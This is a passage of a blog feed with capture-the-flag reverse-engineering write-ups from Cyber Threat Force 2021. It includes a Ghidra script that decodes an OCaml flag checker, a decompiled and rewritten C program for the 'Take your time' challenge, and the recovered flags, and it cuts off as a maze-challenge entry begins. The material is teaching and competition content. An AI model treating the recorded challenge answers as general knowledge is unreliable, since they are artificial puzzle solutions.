&lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">u32&lt;/span>(raw_bytes):
&lt;span style="color:#66d9ef">return&lt;/span> struct&lt;span style="color:#f92672">.&lt;/span>unpack(&lt;span style="color:#e6db74">&amp;#39;&amp;lt;L&amp;#39;&lt;/span>, raw_bytes)[&lt;span style="color:#ae81ff">0&lt;/span>]
&lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">read_caml_array&lt;/span>(pointer, data_len):
array &lt;span style="color:#f92672">=&lt;/span> []
&lt;span style="color:#66d9ef">while&lt;/span> True:
&lt;span style="color:#66d9ef">try&lt;/span>:
array&lt;span style="color:#f92672">.&lt;/span>append(getUBytes(toAddr(pointer), data_len))
&lt;span style="color:#66d9ef">except&lt;/span>:
&lt;span style="color:#66d9ef">break&lt;/span>
pointer &lt;span style="color:#f92672">=&lt;/span> u32(getBytes(toAddr(pointer &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">8&lt;/span>), &lt;span style="color:#ae81ff">4&lt;/span>))
&lt;span style="color:#66d9ef">return&lt;/span> array
&lt;span style="color:#75715e"># The address refers to the argument passed to camlReverse__firstCheck_268.&lt;/span>
&lt;span style="color:#75715e"># For each value, map the bytes to an int, divide by two, and cast to char.&lt;/span>
flag_start &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>join(chr(u32(b) &lt;span style="color:#f92672">//&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span>) &lt;span style="color:#66d9ef">for&lt;/span> b &lt;span style="color:#f92672">in&lt;/span> read_caml_array(&lt;span style="color:#ae81ff">0x00160898&lt;/span>, &lt;span style="color:#ae81ff">4&lt;/span>))
&lt;span style="color:#66d9ef">print&lt;/span>(flag_start)
&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">extractCaml&lt;span style="color:#f92672">.&lt;/span>py&lt;span style="color:#f92672">&amp;gt;&lt;/span> Running&lt;span style="color:#f92672">...&lt;/span>
CYBERTF{Go
extractCaml&lt;span style="color:#f92672">.&lt;/span>py&lt;span style="color:#f92672">&amp;gt;&lt;/span> Finished&lt;span style="color:#960050;background-color:#1e0010">!&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>When reversing the &lt;code>* 2 + 1&lt;/code> operation, all we really have to do is &lt;code>// 2&lt;/code> (because it is an integer division).&lt;/p>
&lt;p>We can now finish the job by extracting the XOR key &amp;amp; data, which are stored using the same array format:&lt;/p>
&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">import&lt;/span> struct
&lt;span style="color:#f92672">import&lt;/span> itertools
&lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">getUBytes&lt;/span>(address, length):
&lt;span style="color:#66d9ef">return&lt;/span> bytearray([b &lt;span style="color:#f92672">&amp;amp;&lt;/span> &lt;span style="color:#ae81ff">0xff&lt;/span> &lt;span style="color:#66d9ef">for&lt;/span> b &lt;span style="color:#f92672">in&lt;/span> getBytes(address, length)])
&lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">u32&lt;/span>(raw_bytes):
&lt;span style="color:#66d9ef">return&lt;/span> struct&lt;span style="color:#f92672">.&lt;/span>unpack(&lt;span style="color:#e6db74">&amp;#39;&amp;lt;L&amp;#39;&lt;/span>, raw_bytes)[&lt;span style="color:#ae81ff">0&lt;/span>]
&lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">read_caml_array&lt;/span>(pointer, data_len):
array &lt;span style="color:#f92672">=&lt;/span> []
&lt;span style="color:#66d9ef">while&lt;/span> True:
&lt;span style="color:#66d9ef">try&lt;/span>:
array&lt;span style="color:#f92672">.&lt;/span>append(getUBytes(toAddr(pointer), data_len))
&lt;span style="color:#66d9ef">except&lt;/span>:
&lt;span style="color:#66d9ef">break&lt;/span>
pointer &lt;span style="color:#f92672">=&lt;/span> u32(getBytes(toAddr(pointer &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">8&lt;/span>), &lt;span style="color:#ae81ff">4&lt;/span>))
&lt;span style="color:#66d9ef">return&lt;/span> array
&lt;span style="color:#75715e"># The address refers to the argument passed to camlReverse__firstCheck_268.&lt;/span>
&lt;span style="color:#75715e"># For each value, map the bytes to an int, divide by two, and cast to char.&lt;/span>
flag_start &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>join(chr(u32(b) &lt;span style="color:#f92672">//&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span>) &lt;span style="color:#66d9ef">for&lt;/span> b &lt;span style="color:#f92672">in&lt;/span> read_caml_array(&lt;span style="color:#ae81ff">0x00160898&lt;/span>, &lt;span style="color:#ae81ff">4&lt;/span>))
&lt;span style="color:#75715e"># The address refers to the argument passed to camlReverse__xor_103.&lt;/span>
&lt;span style="color:#75715e"># For each value, map the bytes to an int.&lt;/span>
xor_key &lt;span style="color:#f92672">=&lt;/span> [u32(x) &lt;span style="color:#66d9ef">for&lt;/span> x &lt;span style="color:#f92672">in&lt;/span> read_caml_array(&lt;span style="color:#ae81ff">0x001601b0&lt;/span>, &lt;span style="color:#ae81ff">4&lt;/span>)]
&lt;span style="color:#75715e"># The address refers to the argument passed to camlReverse__listequal_92.&lt;/span>
&lt;span style="color:#75715e"># For each value, map the bytes to an int.&lt;/span>
xor_data &lt;span style="color:#f92672">=&lt;/span> [u32(x) &lt;span style="color:#66d9ef">for&lt;/span> x &lt;span style="color:#f92672">in&lt;/span> read_caml_array(&lt;span style="color:#ae81ff">0x00160208&lt;/span>, &lt;span style="color:#ae81ff">4&lt;/span>)]
&lt;span style="color:#75715e"># Xor the key with the data, and divide each value by two before converting it to a char.&lt;/span>
flag_end &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#39;&amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>join(chr((a &lt;span style="color:#f92672">^&lt;/span> b) &lt;span style="color:#f92672">//&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span>) &lt;span style="color:#66d9ef">for&lt;/span> a, b &lt;span style="color:#f92672">in&lt;/span> zip(itertools&lt;span style="color:#f92672">.&lt;/span>cycle(xor_key), xor_data))
&lt;span style="color:#66d9ef">print&lt;/span>(flag_start &lt;span style="color:#f92672">+&lt;/span> flag_end)
&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">extractCaml&lt;span style="color:#f92672">.&lt;/span>py&lt;span style="color:#f92672">&amp;gt;&lt;/span> Running&lt;span style="color:#f92672">...&lt;/span>
CYBERTF{Golang_is_D3&lt;span style="color:#a6e22e">@d_1n_CTF_1795b4a89708371d16982195642638cd7783998188&lt;/span>}
extractCaml&lt;span style="color:#f92672">.&lt;/span>py&lt;span style="color:#f92672">&amp;gt;&lt;/span> Finished&lt;span style="color:#960050;background-color:#1e0010">!&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>I have to say, the API doesn&amp;rsquo;t seem too intuitive, but at least it is powerful.&lt;/p>
&lt;h2 id="more">More&lt;/h2>
&lt;p>You can &lt;a href="https://github.com/vivescere/ctf/tree/main/cyber-threat-force-2021/reverse/flag-checker">view the sources on github&lt;/a> or &lt;a href="https://nicolasb.fr/blog/cyber-threat-force-ctf/">read other writeups&lt;/a>.&lt;/p></content></item><item><title>Writeup Cyber Threat Force : Take your time</title><link>https://nicolasb.fr/blog/writeup-cyber-threat-force-2021-reverse-take-your-time/</link><pubDate>Thu, 08 Jul 2021 23:01:09 +0100</pubDate><guid>https://nicolasb.fr/blog/writeup-cyber-threat-force-2021-reverse-take-your-time/</guid><description>For this challenge, we were given a TakeYourTime executable, which seems to hang when we run it. We can analyze its code using ghidra:
unsigned int FLAG[] = { 0xb5, 0x63, 0x98, 0x3d, 0xb5, 0x06, 0x46, 0xba, 0x0f, 0xd5, 0x47, 0xce, 0x97, 0xef, 0x7b, 0x28, 0xdb, 0xe7, 0x39, 0x10, 0xb0, 0xf5, 0x44, 0xec, 0x30, 0x88, 0x46, 0xf6, 0x88, }; undefined8 main(void) { byte bVar1; int iVar2; uint local_28; int local_24; ulong local_20; local_28 = 0; local_20 = 0x32; while (local_20 &amp;lt; 0x4f) { bVar1 = fibonacci(); local_28 = local_28 &amp;gt;&amp;gt; 8 | (local_28 ^ bVar1) &amp;lt;&amp;lt; 0x18; local_20 = local_20 + 1; } srand(local_28); local_24 = 0; while (local_24 &amp;lt; 0x1d) { bVar1 = FLAG[local_24]; iVar2 = rand(); putchar((uint)bVar1 ^ iVar2 % 0xff); local_24 = local_24 + 1; } puts(&amp;#34;\nGood you can validate the chall with this password ;)!</description><content>&lt;p>For this challenge, we were given a &lt;code>TakeYourTime&lt;/code> executable, which seems to hang when we run it. We can analyze its code using ghidra:&lt;/p>
&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> FLAG[] &lt;span style="color:#f92672">=&lt;/span> {
&lt;span style="color:#ae81ff">0xb5&lt;/span>, &lt;span style="color:#ae81ff">0x63&lt;/span>, &lt;span style="color:#ae81ff">0x98&lt;/span>, &lt;span style="color:#ae81ff">0x3d&lt;/span>,
&lt;span style="color:#ae81ff">0xb5&lt;/span>, &lt;span style="color:#ae81ff">0x06&lt;/span>, &lt;span style="color:#ae81ff">0x46&lt;/span>, &lt;span style="color:#ae81ff">0xba&lt;/span>,
&lt;span style="color:#ae81ff">0x0f&lt;/span>, &lt;span style="color:#ae81ff">0xd5&lt;/span>, &lt;span style="color:#ae81ff">0x47&lt;/span>, &lt;span style="color:#ae81ff">0xce&lt;/span>,
&lt;span style="color:#ae81ff">0x97&lt;/span>, &lt;span style="color:#ae81ff">0xef&lt;/span>, &lt;span style="color:#ae81ff">0x7b&lt;/span>, &lt;span style="color:#ae81ff">0x28&lt;/span>,
&lt;span style="color:#ae81ff">0xdb&lt;/span>, &lt;span style="color:#ae81ff">0xe7&lt;/span>, &lt;span style="color:#ae81ff">0x39&lt;/span>, &lt;span style="color:#ae81ff">0x10&lt;/span>,
&lt;span style="color:#ae81ff">0xb0&lt;/span>, &lt;span style="color:#ae81ff">0xf5&lt;/span>, &lt;span style="color:#ae81ff">0x44&lt;/span>, &lt;span style="color:#ae81ff">0xec&lt;/span>,
&lt;span style="color:#ae81ff">0x30&lt;/span>, &lt;span style="color:#ae81ff">0x88&lt;/span>, &lt;span style="color:#ae81ff">0x46&lt;/span>, &lt;span style="color:#ae81ff">0xf6&lt;/span>,
&lt;span style="color:#ae81ff">0x88&lt;/span>,
};
undefined8 &lt;span style="color:#a6e22e">main&lt;/span>(&lt;span style="color:#66d9ef">void&lt;/span>) {
byte bVar1;
&lt;span style="color:#66d9ef">int&lt;/span> iVar2;
uint local_28;
&lt;span style="color:#66d9ef">int&lt;/span> local_24;
ulong local_20;
local_28 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
local_20 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0x32&lt;/span>;
&lt;span style="color:#66d9ef">while&lt;/span> (local_20 &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#ae81ff">0x4f&lt;/span>) {
bVar1 &lt;span style="color:#f92672">=&lt;/span> fibonacci();
local_28 &lt;span style="color:#f92672">=&lt;/span> local_28 &lt;span style="color:#f92672">&amp;gt;&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">8&lt;/span> &lt;span style="color:#f92672">|&lt;/span> (local_28 &lt;span style="color:#f92672">^&lt;/span> bVar1) &lt;span style="color:#f92672">&amp;lt;&amp;lt;&lt;/span> &lt;span style="color:#ae81ff">0x18&lt;/span>;
local_20 &lt;span style="color:#f92672">=&lt;/span> local_20 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>;
}
srand(local_28);
local_24 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
&lt;span style="color:#66d9ef">while&lt;/span> (local_24 &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#ae81ff">0x1d&lt;/span>) {
bVar1 &lt;span style="color:#f92672">=&lt;/span> FLAG[local_24];
iVar2 &lt;span style="color:#f92672">=&lt;/span> rand();
putchar((uint)bVar1 &lt;span style="color:#f92672">^&lt;/span> iVar2 &lt;span style="color:#f92672">%&lt;/span> &lt;span style="color:#ae81ff">0xff&lt;/span>);
local_24 &lt;span style="color:#f92672">=&lt;/span> local_24 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>;
}
puts(&lt;span style="color:#e6db74">&amp;#34;&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">Good you can validate the chall with this password ;)!&amp;#34;&lt;/span>);
&lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
}
&lt;span style="color:#66d9ef">long&lt;/span> &lt;span style="color:#a6e22e">fibonacci&lt;/span>(&lt;span style="color:#66d9ef">long&lt;/span> param_1) {
&lt;span style="color:#66d9ef">long&lt;/span> lVar1;
&lt;span style="color:#66d9ef">long&lt;/span> lVar2;
&lt;span style="color:#66d9ef">if&lt;/span> (param_1 &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>) {
lVar1 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
}
&lt;span style="color:#66d9ef">else&lt;/span> {
&lt;span style="color:#66d9ef">if&lt;/span> (param_1 &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>) {
lVar1 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>;
}
&lt;span style="color:#66d9ef">else&lt;/span> {
lVar2 &lt;span style="color:#f92672">=&lt;/span> fibonacci(param_1 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>);
lVar1 &lt;span style="color:#f92672">=&lt;/span> fibonacci(param_1 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>);
lVar1 &lt;span style="color:#f92672">=&lt;/span> lVar1 &lt;span style="color:#f92672">+&lt;/span> lVar2;
}
}
&lt;span style="color:#66d9ef">return&lt;/span> lVar1;
}
&lt;/code>&lt;/pre>&lt;/div>&lt;p>What&amp;rsquo;s happening there is that the program takes too long to execute: the fibonacci implementation is a naive one (recursive).&lt;/p>
&lt;p>Let&amp;rsquo;s be as lazy as possible and rewrite the program hardcoding the values that are needed:&lt;/p>
&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;stdio.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;stdlib.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;span style="color:#75715e">&lt;/span>
&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#a6e22e">fibo&lt;/span>(&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> param) {
&lt;span style="color:#66d9ef">if&lt;/span> (param &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">50&lt;/span>) &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">12586269025&lt;/span>;
&lt;span style="color:#66d9ef">if&lt;/span> (param &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">51&lt;/span>) &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">20365011074&lt;/span>;
&lt;span style="color:#66d9ef">if&lt;/span> (param &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">52&lt;/span>) &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">32951280099&lt;/span>;
&lt;span style="color:#66d9ef">if&lt;/span> (param &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">53&lt;/span>) &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">53316291173&lt;/span>;
&lt;span style="color:#66d9ef">if&lt;/span> (param &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">54&lt;/span>) &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">86267571272&lt;/span>;
&lt;span style="color:#66d9ef">if&lt;/span> (param &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">55&lt;/span>) &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">139583862445&lt;/span>;
&lt;span style="color:#66d9ef">if&lt;/span> (param &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">56&lt;/span>) &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">225851433717&lt;/span>;
&lt;span style="color:#66d9ef">if&lt;/span> (param &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">57&lt;/span>) &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">365435296162&lt;/span>;
&lt;span style="color:#66d9ef">if&lt;/span> (param &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">58&lt;/span>) &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">591286729879&lt;/span>;
&lt;span style="color:#66d9ef">if&lt;/span> (param &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">59&lt;/span>) &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">956722026041&lt;/span>;
&lt;span style="color:#66d9ef">if&lt;/span> (param &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">60&lt;/span>) &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">1548008755920&lt;/span>;
&lt;span style="color:#66d9ef">if&lt;/span> (param &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">61&lt;/span>) &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">2504730781961&lt;/span>;
&lt;span style="color:#66d9ef">if&lt;/span> (param &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">62&lt;/span>) &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">4052739537881&lt;/span>;
&lt;span style="color:#66d9ef">if&lt;/span> (param &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">63&lt;/span>) &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">6557470319842&lt;/span>;
&lt;span style="color:#66d9ef">if&lt;/span> (param &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">64&lt;/span>) &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">10610209857723&lt;/span>;
&lt;span style="color:#66d9ef">if&lt;/span> (param &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">65&lt;/span>) &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">17167680177565&lt;/span>;
&lt;span style="color:#66d9ef">if&lt;/span> (param &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">66&lt;/span>) &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">27777890035288&lt;/span>;
&lt;span style="color:#66d9ef">if&lt;/span> (param &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">67&lt;/span>) &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">44945570212853&lt;/span>;
&lt;span style="color:#66d9ef">if&lt;/span> (param &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">68&lt;/span>) &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">72723460248141&lt;/span>;
&lt;span style="color:#66d9ef">if&lt;/span> (param &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">69&lt;/span>) &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">117669030460994&lt;/span>;
&lt;span style="color:#66d9ef">if&lt;/span> (param &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">70&lt;/span>) &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">190392490709135&lt;/span>;
&lt;span style="color:#66d9ef">if&lt;/span> (param &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">71&lt;/span>) &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">308061521170129&lt;/span>;
&lt;span style="color:#66d9ef">if&lt;/span> (param &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">72&lt;/span>) &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">498454011879264&lt;/span>;
&lt;span style="color:#66d9ef">if&lt;/span> (param &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">73&lt;/span>) &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">806515533049393&lt;/span>;
&lt;span style="color:#66d9ef">if&lt;/span> (param &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">74&lt;/span>) &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">1304969544928657&lt;/span>;
&lt;span style="color:#66d9ef">if&lt;/span> (param &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">75&lt;/span>) &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">2111485077978050&lt;/span>;
&lt;span style="color:#66d9ef">if&lt;/span> (param &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">76&lt;/span>) &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">3416454622906707&lt;/span>;
&lt;span style="color:#66d9ef">if&lt;/span> (param &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">77&lt;/span>) &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">5527939700884757&lt;/span>;
&lt;span style="color:#66d9ef">if&lt;/span> (param &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">78&lt;/span>) &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">8944394323791464&lt;/span>;
&lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>;
}
&lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#a6e22e">main&lt;/span>(&lt;span style="color:#66d9ef">void&lt;/span>) {
&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> FLAG[] &lt;span style="color:#f92672">=&lt;/span> {
&lt;span style="color:#ae81ff">0xb5&lt;/span>, &lt;span style="color:#ae81ff">0x63&lt;/span>, &lt;span style="color:#ae81ff">0x98&lt;/span>, &lt;span style="color:#ae81ff">0x3d&lt;/span>,
&lt;span style="color:#ae81ff">0xb5&lt;/span>, &lt;span style="color:#ae81ff">0x06&lt;/span>, &lt;span style="color:#ae81ff">0x46&lt;/span>, &lt;span style="color:#ae81ff">0xba&lt;/span>,
&lt;span style="color:#ae81ff">0x0f&lt;/span>, &lt;span style="color:#ae81ff">0xd5&lt;/span>, &lt;span style="color:#ae81ff">0x47&lt;/span>, &lt;span style="color:#ae81ff">0xce&lt;/span>,
&lt;span style="color:#ae81ff">0x97&lt;/span>, &lt;span style="color:#ae81ff">0xef&lt;/span>, &lt;span style="color:#ae81ff">0x7b&lt;/span>, &lt;span style="color:#ae81ff">0x28&lt;/span>,
&lt;span style="color:#ae81ff">0xdb&lt;/span>, &lt;span style="color:#ae81ff">0xe7&lt;/span>, &lt;span style="color:#ae81ff">0x39&lt;/span>, &lt;span style="color:#ae81ff">0x10&lt;/span>,
&lt;span style="color:#ae81ff">0xb0&lt;/span>, &lt;span style="color:#ae81ff">0xf5&lt;/span>, &lt;span style="color:#ae81ff">0x44&lt;/span>, &lt;span style="color:#ae81ff">0xec&lt;/span>,
&lt;span style="color:#ae81ff">0x30&lt;/span>, &lt;span style="color:#ae81ff">0x88&lt;/span>, &lt;span style="color:#ae81ff">0x46&lt;/span>, &lt;span style="color:#ae81ff">0xf6&lt;/span>,
&lt;span style="color:#ae81ff">0x88&lt;/span>,
};
&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> seed &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
&lt;span style="color:#66d9ef">for&lt;/span> (&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> i &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0x32&lt;/span>; i &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#ae81ff">0x4f&lt;/span>; i&lt;span style="color:#f92672">++&lt;/span>) {
&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> res &lt;span style="color:#f92672">=&lt;/span> fibo(i);
seed &lt;span style="color:#f92672">=&lt;/span> seed &lt;span style="color:#f92672">&amp;gt;&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">8&lt;/span> &lt;span style="color:#f92672">|&lt;/span> (seed &lt;span style="color:#f92672">^&lt;/span> res) &lt;span style="color:#f92672">&amp;lt;&amp;lt;&lt;/span> &lt;span style="color:#ae81ff">0x18&lt;/span>;
}
srand(seed);
&lt;span style="color:#66d9ef">for&lt;/span> (&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> i2 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>; i2 &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#ae81ff">0x1d&lt;/span>; i2&lt;span style="color:#f92672">++&lt;/span>) {
&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> res &lt;span style="color:#f92672">=&lt;/span> FLAG[i2];
putchar((&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span>) res &lt;span style="color:#f92672">^&lt;/span> rand() &lt;span style="color:#f92672">%&lt;/span> &lt;span style="color:#ae81ff">0xff&lt;/span>);
}
puts(&lt;span style="color:#e6db74">&amp;#34;&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>);
&lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
}
&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">$ gcc solve.c -o solve
... &lt;span style="color:#f92672">(&lt;/span>lots of warnings&lt;span style="color:#f92672">)&lt;/span>
$ ./solve
CYBERTF&lt;span style="color:#f92672">{&lt;/span>Fuck_Fibo_3v3ryWhere&lt;span style="color:#f92672">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>Here we go, the flag is &lt;code>CYBERTF{Fuck_Fibo_3v3ryWhere}&lt;/code>.&lt;/p>
&lt;p>You can &lt;a href="https://github.com/vivescere/ctf/tree/main/cyber-threat-force-2021/reverse/take-your-time">view the sources on github&lt;/a> or &lt;a href="https://nicolasb.fr/blog/cyber-threat-force-ctf/">read other writeups&lt;/a>.&lt;/p></content></item><item><title>Writeup Cyber Threat Force : Return to the school</title><link>https://nicolasb.fr/blog/writeup-cyber-threat-force-2021-misc-return-to-the-school/</link><pubDate>Thu, 08 Jul 2021 22:12:09 +0100</pubDate><guid>https://nicolasb.fr/blog/writeup-cyber-threat-force-2021-misc-return-to-the-school/</guid><description>This challenge involved solving an ASCII maze in under 10 seconds. I can&amp;rsquo;t include a demo because I&amp;rsquo;m writing this after the CTF ended.
My script uses the astar package, because I was too lazy to re-implement A* manually. It isn&amp;rsquo;t particularly pretty, but at least it is functionnal.
Here it is:
